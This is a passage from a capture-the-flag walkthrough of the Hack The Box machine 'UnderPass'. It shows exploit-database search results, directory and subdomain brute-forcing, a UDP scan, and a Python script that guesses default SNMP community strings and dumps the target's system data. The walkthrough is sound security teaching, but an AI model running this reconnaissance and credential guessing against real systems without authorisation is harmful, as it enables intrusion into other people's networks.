+</span></span><span style=display:flex><span>Apache HTTP Server 2.4.49 - Path Traversal &amp; Remote Code Execution <span style=color:#f92672>(</span>RCE<span style=color:#f92672>)</span>                                                                                 | multiple/webapps/50383.sh
+</span></span><span style=display:flex><span>Apache HTTP Server 2.4.50 - Path Traversal &amp; Remote Code Execution <span style=color:#f92672>(</span>RCE<span style=color:#f92672>)</span>                                                                                 | multiple/webapps/50406.sh
+</span></span><span style=display:flex><span>Apache HTTP Server 2.4.50 - Remote Code Execution <span style=color:#f92672>(</span>RCE<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>                                                                                              | multiple/webapps/50446.sh
+</span></span><span style=display:flex><span>Apache HTTP Server 2.4.50 - Remote Code Execution <span style=color:#f92672>(</span>RCE<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>3<span style=color:#f92672>)</span>                                                                                              | multiple/webapps/50512.py
+</span></span><span style=display:flex><span>Apache mod_ssl &lt; 2.8.7 OpenSSL - <span style=color:#e6db74>&#39;OpenFuck.c&#39;</span> Remote Buffer Overflow                                                                                     | unix/remote/21671.c
+</span></span><span style=display:flex><span>Apache mod_ssl &lt; 2.8.7 OpenSSL - <span style=color:#e6db74>&#39;OpenFuckV2.c&#39;</span> Remote Buffer Overflow <span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>                                                                               | unix/remote/764.c
+</span></span><span style=display:flex><span>Apache mod_ssl &lt; 2.8.7 OpenSSL - <span style=color:#e6db74>&#39;OpenFuckV2.c&#39;</span> Remote Buffer Overflow <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>                                                                               | unix/remote/47080.c
+</span></span><span style=display:flex><span>Apache OpenMeetings 1.9.x &lt; 3.1.0 - <span style=color:#e6db74>&#39;.ZIP&#39;</span> File Directory Traversal                                                                                      | linux/webapps/39642.txt
+</span></span><span style=display:flex><span>Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE <span style=color:#f92672>(</span>Metasploit<span style=color:#f92672>)</span>                                                                                         | multiple/remote/48410.rb
+</span></span><span style=display:flex><span>Apache Tomcat 3.2.3/3.2.4 - <span style=color:#e6db74>&#39;RealPath.jsp&#39;</span> Information Disclosuree                                                                                       | multiple/remote/21492.txt
+</span></span><span style=display:flex><span>Apache Tomcat 3.2.3/3.2.4 - <span style=color:#e6db74>&#39;Source.jsp&#39;</span> Information Disclosure                                                                                          | multiple/remote/21490.txt
+</span></span><span style=display:flex><span>Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                                                  | multiple/remote/21491.txt
+</span></span><span style=display:flex><span>Apache Tomcat &lt; 5.5.17 - Remote Directory Listing                                                                                                        | multiple/remote/2061.txt
+</span></span><span style=display:flex><span>Apache Tomcat &lt; 6.0.18 - <span style=color:#e6db74>&#39;utf8&#39;</span> Directory Traversal                                                                                                      | unix/remote/14489.c
+</span></span><span style=display:flex><span>Apache Tomcat &lt; 6.0.18 - <span style=color:#e6db74>&#39;utf8&#39;</span> Directory Traversal <span style=color:#f92672>(</span>PoC<span style=color:#f92672>)</span>                                                                                                | multiple/remote/6229.txt
+</span></span><span style=display:flex><span>Apache Tomcat &lt; 9.0.1 <span style=color:#f92672>(</span>Beta<span style=color:#f92672>)</span> / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution <span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>                                             | windows/webapps/42953.txt
+</span></span><span style=display:flex><span>Apache Tomcat &lt; 9.0.1 <span style=color:#f92672>(</span>Beta<span style=color:#f92672>)</span> / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution <span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>                                             | jsp/webapps/42966.py
+</span></span><span style=display:flex><span>Apache Xerces-C XML Parser &lt; 3.1.2 - Denial of Service <span style=color:#f92672>(</span>PoC<span style=color:#f92672>)</span>                                                                                             | linux/dos/36906.txt
+</span></span><span style=display:flex><span>Webfroot Shoutbox &lt; 2.32 <span style=color:#f92672>(</span>Apache<span style=color:#f92672>)</span> - Local File Inclusion / Remote Code Execution                                                                         | linux/remote/34.pl
+</span></span><span style=display:flex><span>--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results
+</span></span><span style=display:flex><span>└─$ searchsploit openssh 8.9
+</span></span><span style=display:flex><span>Exploits: No Results
+</span></span><span style=display:flex><span>Shellcodes: No Results
+</span></span></code></pre></div><p>That doesn&rsquo;t necessarily mean there isn&rsquo;t a vulnerability there, but it seems like a dead end, especially when there are other avenues to explore. Let&rsquo;s try web enumeration next. We can scan for files as well as possible hidden subdomains at the same time.</p><p>Interestingly, neither of them give us much to work with:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ gobuster dir -u http://underpass.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Gobuster v3.6
+</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://underpass.htb/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>50</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.6
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Starting gobuster in directory enumeration mode
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>220559</span> / <span style=color:#ae81ff>220560</span> <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Finished
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>└─$ gobuster dir -u http://underpass.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,php -t 50
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Gobuster v3.6
+</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://underpass.htb/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>50</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.6
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              html,php
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Starting gobuster in directory enumeration mode
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>/.htpasswd.html       <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/.htaccess            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/.htaccess.html       <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/.htaccess.php        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/.htpasswd.php        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/.htpasswd            <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/index.html           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 10671<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 278<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>61434</span> / <span style=color:#ae81ff>61437</span> <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Finished
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>└─$ gobuster vhost --append-domain -u http://underpass.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Gobuster v3.6
+</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:             http://underpass.htb/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:          GET
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:         <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:      gobuster/3.6
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:         10s
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Append Domain:   true
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Starting gobuster in VHOST enumeration mode
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>19966</span> / <span style=color:#ae81ff>19967</span> <span style=color:#f92672>(</span>99.99%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Finished
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span></code></pre></div><p>Guess it&rsquo;s time to try UDP?</p><p>Sure enough:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.95 scan initiated Mon Jun 23 16:23:28 2025 as: /usr/lib/nmap/nmap --privileged -oN udpscan -sU -vvv underpass</span>
+</span></span><span style=display:flex><span>Increasing send delay <span style=color:#66d9ef>for</span> 10.129.231.213 from <span style=color:#ae81ff>50</span> to <span style=color:#ae81ff>100</span> due to <span style=color:#ae81ff>11</span> out of <span style=color:#ae81ff>15</span> dropped probes since last increase.
+</span></span><span style=display:flex><span>Increasing send delay <span style=color:#66d9ef>for</span> 10.129.231.213 from <span style=color:#ae81ff>100</span> to <span style=color:#ae81ff>200</span> due to <span style=color:#ae81ff>11</span> out of <span style=color:#ae81ff>15</span> dropped probes since last increase.
+</span></span><span style=display:flex><span>Increasing send delay <span style=color:#66d9ef>for</span> 10.129.231.213 from <span style=color:#ae81ff>200</span> to <span style=color:#ae81ff>400</span> due to <span style=color:#ae81ff>11</span> out of <span style=color:#ae81ff>14</span> dropped probes since last increase.
+</span></span><span style=display:flex><span>Increasing send delay <span style=color:#66d9ef>for</span> 10.129.231.213 from <span style=color:#ae81ff>400</span> to <span style=color:#ae81ff>800</span> due to <span style=color:#ae81ff>11</span> out of <span style=color:#ae81ff>19</span> dropped probes since last increase.
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> underpass <span style=color:#f92672>(</span>10.129.231.213<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Host is up, received reset ttl <span style=color:#ae81ff>63</span> <span style=color:#f92672>(</span>0.065s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Scanned at 2025-06-23 16:23:28 MDT <span style=color:#66d9ef>for</span> 1253s
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>996</span> closed udp ports <span style=color:#f92672>(</span>port-unreach<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PORT     STATE         SERVICE REASON
+</span></span><span style=display:flex><span>68/udp   open|filtered dhcpc   no-response
+</span></span><span style=display:flex><span>161/udp  open          snmp    udp-response ttl <span style=color:#ae81ff>63</span>
+</span></span><span style=display:flex><span>1812/udp open|filtered radius  no-response
+</span></span><span style=display:flex><span>1813/udp open|filtered radacct no-response
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Read data files from: /usr/share/nmap
+</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Mon Jun 23 16:44:21 2025 -- 1 IP address (1 host up) scanned in 1252.87 seconds</span>
+</span></span></code></pre></div><h3 id=foothold>Foothold</h3><p>Using a python script we can enumerate SNMP:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> asyncio
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pysnmp.hlapi.v3arch.asyncio <span style=color:#f92672>import</span> (
+</span></span><span style=display:flex><span>    SnmpEngine, CommunityData, UdpTransportTarget, ContextData,
+</span></span><span style=display:flex><span>    ObjectType, ObjectIdentity, walk_cmd
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>### SNMP Enumeration Script for Hack the Box</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;underpass.htb&#34;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>161</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># List of interesting OID roots to walk</span>
+</span></span><span style=display:flex><span>OID_ROOTS <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;System&#34;</span>, <span style=color:#e6db74>&#34;1.3.6.1.2.1.1&#34;</span>),
+</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;Interfaces&#34;</span>, <span style=color:#e6db74>&#34;1.3.6.1.2.1.2&#34;</span>),
+</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;IP&#34;</span>, <span style=color:#e6db74>&#34;1.3.6.1.2.1.4&#34;</span>),
+</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;TCP&#34;</span>, <span style=color:#e6db74>&#34;1.3.6.1.2.1.6&#34;</span>),
+</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;UDP&#34;</span>, <span style=color:#e6db74>&#34;1.3.6.1.2.1.7&#34;</span>),
+</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#34;Host Resources&#34;</span>, <span style=color:#e6db74>&#34;1.3.6.1.2.1.25.1&#34;</span>)
+</span></span><span style=display:flex><span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>snmp_walk</span>(community_string, oid, label<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>):
+</span></span><span style=display:flex><span>    transport <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> UdpTransportTarget<span style=color:#f92672>.</span>create((HOST, PORT))
+</span></span><span style=display:flex><span>    found_any <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> label:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>--- </span><span style=color:#e6db74>{</span>label<span style=color:#e6db74>}</span><span style=color:#e6db74> (</span><span style=color:#e6db74>{</span>oid<span style=color:#e6db74>}</span><span style=color:#e6db74>) ---&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>for</span> (errorIndication, errorStatus, errorIndex, varBinds) <span style=color:#f92672>in</span> walk_cmd(
+</span></span><span style=display:flex><span>        SnmpEngine(),
+</span></span><span style=display:flex><span>        CommunityData(community_string, mpModel<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>),  <span style=color:#75715e># SNMPv1</span>
+</span></span><span style=display:flex><span>        transport,
+</span></span><span style=display:flex><span>        ContextData(),
+</span></span><span style=display:flex><span>        ObjectType(ObjectIdentity(oid)),
+</span></span><span style=display:flex><span>    ):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> errorIndication:
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error: </span><span style=color:#e6db74>{</span>errorIndication<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> errorStatus:
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error: </span><span style=color:#e6db74>{</span>errorStatus<span style=color:#f92672>.</span>prettyPrint()<span style=color:#e6db74>}</span><span style=color:#e6db74> at </span><span style=color:#e6db74>{</span>errorIndex <span style=color:#f92672>and</span> varBinds[int(errorIndex) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>][<span style=color:#ae81ff>0</span>] <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;?&#39;</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> varBind <span style=color:#f92672>in</span> varBinds:
+</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>varBind[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74> = </span><span style=color:#e6db74>{</span>varBind[<span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>                found_any <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> found_any:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;No results or access denied.&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> found_any
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Enumerating SNMP on </span><span style=color:#e6db74>{</span>HOST<span style=color:#e6db74>}</span><span style=color:#e6db74>:</span><span style=color:#e6db74>{</span>PORT<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    community_strings <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;public&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;private&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;manager&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;admin&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;root&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;snmp&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;snmpwalk&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;snmpwalk2&#34;</span>,
+</span></span><span style=display:flex><span>    ]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    valid_communities <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> community <span style=color:#f92672>in</span> community_strings:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Trying community string: </span><span style=color:#e6db74>{</span>community<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#66d9ef>await</span> snmp_walk(community, <span style=color:#e6db74>&#34;1.3.6.1.2.1.1&#34;</span>, label<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;System (Test)&#34;</span>):
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Found valid community string: </span><span style=color:#e6db74>{</span>community<span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>            valid_communities<span style=color:#f92672>.</span>append(community)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Community string </span><span style=color:#e6db74>{</span>community<span style=color:#e6db74>}</span><span style=color:#e6db74> is not valid.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> valid_communities:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;No valid community strings found.&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> community <span style=color:#f92672>in</span> valid_communities:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>===== Enumerating data for community string: </span><span style=color:#e6db74>{</span>community<span style=color:#e6db74>}</span><span style=color:#e6db74> =====&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> label, oid <span style=color:#f92672>in</span> OID_ROOTS:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> oid <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1.3.6.1.2.1.1&#34;</span>:  <span style=color:#75715e># Skip System, already done</span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>await</span> snmp_walk(community, oid, label<span style=color:#f92672>=</span>label)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    asyncio<span style=color:#f92672>.</span>run(main())
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ python snmp-explore.py
+</span></span><span style=display:flex><span>Enumerating SNMP on underpass.htb:161
+</span></span><span style=display:flex><span>Trying community string: public
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>--- System <span style=color:#f92672>(</span>Test<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>1.3.6.1.2.1.1<span style=color:#f92672>)</span> ---
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.1.0 <span style=color:#f92672>=</span> Linux underpass 5.15.0-126-generic <span style=color:#75715e>#136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.2.0 <span style=color:#f92672>=</span> 1.3.6.1.4.1.8072.3.2.10
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.3.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>450000</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.4.0 <span style=color:#f92672>=</span> steve@underpass.htb
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.5.0 <span style=color:#f92672>=</span> UnDerPass.htb is the only daloradius server in the basin!
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.6.0 <span style=color:#f92672>=</span> Nevada, U.S.A. but not Vegas
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.7.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>72</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.8.0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.1 <span style=color:#f92672>=</span> 1.3.6.1.6.3.10.3.1.1
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.2 <span style=color:#f92672>=</span> 1.3.6.1.6.3.11.3.1.1
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.3 <span style=color:#f92672>=</span> 1.3.6.1.6.3.15.2.1.1
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.4 <span style=color:#f92672>=</span> 1.3.6.1.6.3.1
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.5 <span style=color:#f92672>=</span> 1.3.6.1.6.3.16.2.2.1
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.6 <span style=color:#f92672>=</span> 1.3.6.1.2.1.49
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.7 <span style=color:#f92672>=</span> 1.3.6.1.2.1.50
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.8 <span style=color:#f92672>=</span> 1.3.6.1.2.1.4
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.9 <span style=color:#f92672>=</span> 1.3.6.1.6.3.13.3.1.3
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.2.10 <span style=color:#f92672>=</span> 1.3.6.1.2.1.92
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.1 <span style=color:#f92672>=</span> The SNMP Management Architecture MIB.
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.2 <span style=color:#f92672>=</span> The MIB <span style=color:#66d9ef>for</span> Message Processing and Dispatching.
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.3 <span style=color:#f92672>=</span> The management information definitions <span style=color:#66d9ef>for</span> the SNMP User-based Security Model.
+</span></span><span style=display:flex><span>1.3.6.1.2.1.1.9.1.3.4 <span style=color:#f92672>=</span> The MIB module <span style=color:#66d9ef>for</span> SNMPv2 entities
